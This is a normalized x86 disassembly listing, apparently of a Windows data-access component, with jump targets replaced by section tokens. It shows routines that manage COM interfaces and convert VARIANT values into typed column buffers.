jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ ecx + eax + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
mov esi [ esi + 0x54 ]
lea eax [ ebp + 0xc ]
push eax
mov ecx esi
mov [ ebp + 0xc ] edi
call sub_408e3a
test al al
je r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x54 ] 0x6
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x54 ]
jmp r-xdata
xor eax eax
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + ecx + 0x4 ]
add eax [ esi + 0x8 ]
jmp r-xdata
fld [ eax ]
mov [ ebp - 0xc4 ] 0x7
fstp [ ebp - 0xbc ]
lea eax [ ebp - 0xc4 ]
lea ecx [ ebp - 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0xc4 ]
jmp r-xdata
sub_409858
lea eax [ esp + 0x4 ]
push esi
mov esi ecx
push eax
call sub_408e3a
test al al
je r-xdata
xor al al
mov eax [ esp + 0x8 ]
mov ecx [ esi + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
add eax ecx
mov ecx [ eax + 0x10 ]
mov eax [ eax + 0x4 ]
mov edx ecx
and edx 0x3
add eax edx
add eax [ esi + 0x8 ]
mov eax [ eax + ecx + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
pop esi
retn 0x8
sub_4098b3
mov eax sub_4264fc
call sub_40cc20
sub esp 0x6c
push edi
mov edi ecx
xor ecx ecx
cmp [ edi + 0x10 ] ecx
mov [ edi + 0x44 ] 0x1
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x18 ] ecx
jle r-xdata
mov ecx [ ebp - 0xc ]
and [ edi + 0x44 ] 0x0
xor eax eax
pop edi
mov [ fs : 0x0 ] ecx
leave
retn
push ebx
mov ebx [ VariantClear@IAT ]
push esi
inc ecx
cmp ecx [ edi + 0x10 ]
mov [ ebp - 0x18 ] ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
shl ecx 0x4
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ edi + 0x14 ]
lea eax [ ecx + ecx * 4 ]
mov eax [ edx + eax * 8 + 0x24 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop esi
pop ebx
mov ecx [ eax ]
mov esi [ eax + 0x8 ]
push 0x20
lea eax [ ebp - 0x78 ]
push 0x0
push eax
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x24 ] 0xfffffffd
call sub_40cc70
add esp 0xc
lea eax [ ebp - 0x38 ]
push eax
call sub_40b948
and [ ebp - 0x4 ] 0x0
cmp [ edi + 0x48 ] 0x0
je r-xdata
mov eax [ edi + 0x40 ]
add eax [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx edi
inc eax
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_4090dc
push eax
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] 0x1
call sub_40b92e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x58 ]
push eax
call ebx
lea eax [ ebp - 0x38 ]
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x38 ]
push eax
call ebx
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x24 ]
push 0x1
mov [ ebp - 0x44 ] eax
pop eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ esi + 0xa0 ] eax
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x1c ]
push edx
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
push 0x0
push edx
push 0x4
push 0x0
push r--data
push [ esi + 0x94 ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
and [ esi + 0xa0 ] 0x0
cmp [ ebp - 0x74 ] 0x0
je r-xdata
cmp [ ebp - 0x70 ] 0x0
je r-xdata
push [ ebp - 0x74 ]
call [ SysFreeString@IAT ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
push [ ebp - 0x70 ]
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x38 ]
push eax
call ebx
inc [ ebp - 0x10 ]
add [ ebp - 0x14 ] 0x10
push [ ebp - 0x6c ]
call [ SysFreeString@IAT ]
sub_409a48
mov eax sub_426523
call sub_40cc20
sub esp 0xb4
push ebx
push esi
push edi
mov ebx ecx
xor edi edi
cmp [ ebx + 0x48 ] edi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x18 ] edi
je r-xdata
cmp [ ebx + 0xc ] edi
lea ecx [ ebx + 0xc ]
jne r-xdata
cmp [ ebx + 0x54 ] edi
je r-xdata
cmp [ ebx + 0x10 ] edi
mov [ ebp - 0x20 ] edi
jle r-xdata
mov eax [ ebx + 0x8 ]
push ecx
push r--data
push eax
mov edx [ eax ]
call [ edx ]
cmp eax edi
jl r-xdata
xor eax eax
push 0x1
pop esi
cmp [ ebx + 0x10 ] esi
mov [ ebp - 0x34 ] esi
jl r-xdata
mov eax [ ebx + 0x1c ]
cmp eax edi
mov [ ebp - 0x1c ] eax
je r-xdata
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x20 ] 0x30
mov [ ebp - 0x1c ] 0x28
cmp [ ebp - 0x18 ] edi
jle r-xdata
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
mov eax [ esi ]
mov eax [ eax + 0x4c ]
cmp eax edi
je r-xdata
inc [ ebp - 0x20 ]
add [ ebp - 0x34 ] 0x28
mov eax [ ebp - 0x20 ]
cmp eax [ ebx + 0x10 ]
jl r-xdata
mov edx [ ebp - 0x40 ]
lea edx [ edx + edx * 2 ]
shl edx 0x4
mov [ ebp - 0x1c ] edx
add [ ebp - 0x1c ] 0x28
add [ ebp - 0x20 ] 0x30
inc esi
cmp esi [ ebx + 0x10 ]
mov [ ebp - 0x34 ] esi
jle r-xdata
mov ecx eax
mov eax [ eax ]
mov [ ebp - 0x44 ] eax
mov ecx [ ecx + 0x8 ]
cmp [ ecx + 0xa4 ] edi
lea edx [ ecx + 0xa4 ]
je r-xdata
mov eax [ ebx + 0xc ]
push edi
push edi
push edi
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
mov esi eax
mov [ ebx + 0x44 ] edi
cmp esi edi
jge r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + eax + 0x24 ]
mov eax [ eax + 0x4 ]
cmp eax edi
je r-xdata
inc [ ebp - 0x40 ]
add edx 0x30
cmp eax edi
mov [ ebp - 0x1c ] edx
jne r-xdata
inc [ ebp - 0x18 ]
push 0x1
pop esi
mov [ ecx ] edi
cmp [ ebp - 0x18 ] esi
jne r-xdata
mov eax [ ebx + 0x14 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ecx + eax - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ ebp - 0x18 ] edi
jle r-xdata
inc [ ebp - 0x40 ]
jmp r-xdata
inc [ ebp - 0x18 ]
push 0x1
pop eax
mov [ edx ] edi
cmp [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x10 ]
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x10 ]
push [ esi + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x10 ]
test eax eax
jne r-xdata
mov ecx eax
mov eax [ eax ]
mov [ ebp - 0x3c ] eax
mov ecx [ ecx + 0x8 ]
mov [ ebp - 0x10 ] ecx
add ecx 0xa4
cmp [ ecx ] edi
je r-xdata
push 0x10
lea eax [ ebp - 0x58 ]
pop esi
push eax
call sub_40b948
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
lea ecx [ eax + 0xa8 ]
mov [ ebp - 0x48 ] ecx
movzx eax [ ecx ]
cmp eax edi
jl r-xdata
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0x44 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jl r-xdata
mov [ ebx + 0x44 ] edi
cmp eax edi
je r-xdata
lea eax [ ecx + 0xa8 ]
lea ecx [ ebp - 0x30 ]
push eax
mov [ ebp - 0x48 ] eax
call sub_40b7f0
mov [ ebp - 0x4 ] edi
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0xac ] edi
mov [ ebp - 0xa8 ] edi
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0x94 ] edi
mov [ ebp - 0x8c ] edi
mov [ ebp - 0xa0 ] edi
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_408e3a
test al al
je r-xdata
mov [ ebx + 0x44 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc [ ebp - 0x18 ]
push 0x1
pop esi
cmp [ ebp - 0x18 ] esi
jne r-xdata
push ecx
lea ecx [ ebp - 0x58 ]
call sub_40b92e
cmp eax 0x1
jle r-xdata
cmp [ ebp - 0x44 ] esi
jne r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0xc ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp eax edi
jl r-xdata
or esi 0xffffffff
cmp eax 0x8
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax [ ebx + 0xc ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
xor ecx ecx
mov eax [ ebp - 0x10 ]
lea ecx [ eax + eax * 2 ]
mov eax [ ebp - 0x14 ]
shl ecx 0x4
mov edx [ eax + 0x10 ]
mov ecx [ ecx + edx + 0x4 ]
add ecx [ eax + 0x8 ]
jmp r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
lea ecx [ ebp - 0xb0 ]
push eax
push 0x1
call sub_40a3f9
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_408e3a
test al al
je r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xb0 ]
cmp [ eax ] di
jne r-xdata
cmp eax 0xa
je r-xdata
movzx eax [ ebp - 0x3c ]
mov ecx 0x81
cmp eax ecx
jg r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov ax [ eax + ecx + 0x14 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
push edi
push edi
mov eax [ eax + 0x10 ]
push ecx
add eax edx
push [ eax + 0x10 ]
mov cx [ eax + 0x14 ]
push ecx
lea ecx [ ebp - 0xb0 ]
push [ eax + 0x8 ]
call sub_40a470
mov eax [ ebx + 0x50 ]
lea ecx [ ebp - 0xb0 ]
push [ eax ]
call sub_40a4c4
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax [ ebx + 0xc ]
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax edi
jl r-xdata
or esi 0xffffffff
jmp r-xdata
jmp r-xdata
sub eax 0x82
je r-xdata
je r-xdata
mov eax [ ebx + 0x3c ]
mov ecx [ ebp - 0x1c ]
add eax ecx
mov [ ebp - 0x80 ] edi
mov [ ebp - 0x7c ] 0x1
mov ecx [ eax + 0x2c ]
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x78 ] ecx
lea ecx [ ebp - 0x58 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebx + 0xc ]
lea esi [ ebp - 0x80 ]
mov [ ebp - 0x74 ] edi
mov edx [ ecx ]
push esi
push eax
push ecx
call [ edx + 0x10 ]
push [ ebp - 0x48 ]
mov esi [ VariantClear@IAT ]
call esi
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x58 ]
push eax
call esi
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x1c ]
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_408e3a
test al al
je r-xdata
sub eax 0x5
jne r-xdata
push edi
push 0x8
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] esi
call sub_408e3a
test al al
je r-xdata
cmp eax 0x8
jg r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x50 ]
lea ecx [ ebp - 0xb0 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebx + 0x50 ]
call sub_40a38b
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x54 ]
push [ ebp - 0x48 ]
mov [ ecx + 0x8 ] eax
call [ VariantClear@IAT ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0xb0 ]
call sub_40a3e2
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x30 ]
push eax
call [ VariantClear@IAT ]
mov eax [ ebp - 0x44 ]
push edi
push 0x7
lea ecx [ ebp - 0x30 ]
call sub_40b903
push 0x10
lea eax [ ebp - 0x68 ]
push edi
push eax
call sub_40cc70
fld [ ebp - 0x28 ]
add esp 0xc
lea eax [ ebp - 0x58 ]
push eax
push ecx
push ecx
fstp [ esp ]
call [ VariantTimeToSystemTime@IAT ]
mov ax [ ebp - 0x58 ]
mov ecx 0xf4240
mov [ ebp - 0x68 ] ax
mov ax [ ebp - 0x56 ]
mov [ ebp - 0x66 ] ax
mov ax [ ebp - 0x52 ]
mov [ ebp - 0x64 ] ax
mov ax [ ebp - 0x50 ]
mov [ ebp - 0x62 ] ax
mov ax [ ebp - 0x4e ]
mov [ ebp - 0x60 ] ax
mov ax [ ebp - 0x4c ]
mov [ ebp - 0x5e ] ax
mov [ ebp - 0x10 ] esi
movzx eax [ ebp - 0x4a ]
cdq
idiv ecx
mov ecx [ ebx + 0x54 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x5c ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_408e3a
test al al
je r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
sub eax 0xb
je r-xdata
je r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
push [ ebp - 0x28 ]
push eax
call sub_40e2a0
add esp 0xc
lea esi [ ebp - 0x68 ]
lea edi [ ebp - 0x78 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl eax 0x4
movsd [ edi ] [ esi ]
mov eax [ eax + edx + 0x4 ]
lea esi [ ebp - 0x78 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebx + 0x54 ]
mov edx [ ebp - 0x20 ]
push edi
push edi
mov ecx [ ecx + 0x10 ]
push [ ecx + edx + 0x10 ]
push eax
push 0xffffffff
push [ ebp - 0x28 ]
push edi
push edi
call [ WideCharToMultiByte@IAT ]
jmp r-xdata
push edi
push 0xb
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
sub eax 0x3
je r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0xe
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
dec eax
je r-xdata
push edi
push 0x2
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cx [ ebp - 0x28 ]
mov [ eax ] cx
jmp r-xdata
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0xc0 ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl eax 0x4
movsd [ edi ] [ esi ]
mov eax [ eax + edx + 0x4 ]
lea esi [ ebp - 0xc0 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
push edi
push 0x10
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov al [ ebp - 0x28 ]
mov ecx [ ebx + 0x54 ]
mov [ ebp - 0x35 ] al
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x3
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp - 0x34 ]
xor edi edi
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cl [ ebp - 0x35 ]
push edi
push 0x11
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x4
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov cl [ ebp - 0x28 ]
jmp r-xdata
push edi
push 0x12
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x5
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
je r-xdata
mov [ eax ] cl
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
push edi
push 0x13
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
jmp r-xdata
push edi
push 0x6
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov edx [ ecx + 0x10 ]
fld [ ebp - 0x28 ]
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
fstp [ eax ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
mov eax [ eax + edx + 0x4 ]
add eax [ ecx + 0x8 ]
jmp r-xdata
push edi
push 0x7
lea ecx [ ebp - 0x30 ]
call sub_40b903
mov ecx [ ebx + 0x54 ]
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] ecx
call sub_408e3a
test al al
je r-xdata
mov ecx [ ebp - 0x28 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x24 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
lea eax [ eax + eax * 2 ]
shl eax 0x4
sub_40a38b
push ebx
push esi
mov esi ecx
push edi
xor eax eax
xor ebx ebx
mov ecx [ esi + 0x8 ]
mov edi [ ecx + 0x4 ]
test edi edi
jbe r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov ecx esi
call sub_40a3b3
test eax eax
jl r-xdata
inc ebx
cmp ebx edi
jb r-xdata
sub_40a3b3
mov edx [ ecx + 0x4 ]
test edx edx
je r-xdata
mov eax 0x80004002
mov eax [ ecx + 0x8 ]
push esi
push edi
mov edi [ esp + 0xc ]
mov esi [ eax + 0x8 ]
mov eax [ eax ]
push esi
mov eax [ eax + edi * 8 ]
mov edi [ edx ]
push eax
push [ ecx + 0xc ]
push edx
call [ edi + 0x10 ]
pop edi
pop esi
jmp r-xdata
retn 0x4
sub_40a3f9
mov eax sub_426530
call sub_40cc20
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
push [ esi + 0xc ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ esi + 0x18 ] eax
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] ebx
call sub_41b82f
imul edi edi 0x34
push edi
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_41b806
pop ecx
mov [ esi + 0xc ] eax
pop ecx
jmp r-xdata
mov eax [ esi + 0xc ]
mov ecx [ ebp - 0xc ]
neg eax
sbb eax eax
pop edi
and eax 0x7ff8fff2
pop esi
add eax 0x8007000e
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
sub_40a470
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
xor edx edx
push esi
cmp eax edx
mov esi ecx
je r-xdata
xor eax eax
sub eax [ esi + 0x8 ]
jmp r-xdata
xor ecx ecx
sub ecx [ esi + 0x8 ]
jmp r-xdata
mov ecx [ ebp + 0x18 ]
cmp ecx edx
je r-xdata
push edx
push eax
mov eax [ ebp + 0x14 ]
push ecx
sub eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x14 ]
imul eax eax 0x34
push edx
push edx
push edx
add eax [ esi + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_408c13
add esp 0x2c
inc [ esi + 0x14 ]
pop esi
pop ebp
retn 0x18
sub_40a4c4
mov eax sub_426544
call sub_40cc20
push ecx
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi ecx
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx [ eax ]
push edx
push rw-data
push eax
call [ ecx ]
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
or [ ebp - 0x4 ] 0xffffffff
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
push [ ebp - 0x10 ]
push [ esi + 0x18 ]
push [ esi ]
push [ esi + 0x10 ]
push [ esi + 0xc ]
call sub_408bc9
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
mov eax [ ebp - 0x10 ]
add esp 0x14
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_408b6d
mov ebx eax
test ebx ebx
jge r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ esi ]
mov [ eax + 0x4 ] 0x1
sub_40a5a3
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x80010001
je r-xdata
pop esi
leave
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ eax + 0x4c ]
lea edx [ ebp - 0x4 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov ecx esi
call sub_40a626
test eax eax
je r-xdata
lea edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
push edx
xor edx edx
cmp [ esi + 0xc ] edx
mov ecx [ eax ]
setne dl
push edx
push [ esi + 0x8 ]
push eax
call [ ecx + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ esi + 0xc ]
push 0xd
pop edx
cmp [ ecx + 0x88 ] 0x0
je r-xdata
mov ecx [ esi ]
push edi
push eax
push edx
push [ esi + 0x8 ]
mov edi [ ecx ]
push ecx
call [ edi + 0x68 ]
add esp 0x10
pop edi
mov edx 0x800d
sub_40a626
push esi
mov esi ecx
mov ecx [ esi + 0xc ]
test ecx ecx
jne r-xdata
mov eax [ ecx ]
call [ eax + 0xb0 ]
mov eax [ esi + 0xc ]
push 0x1
push esi
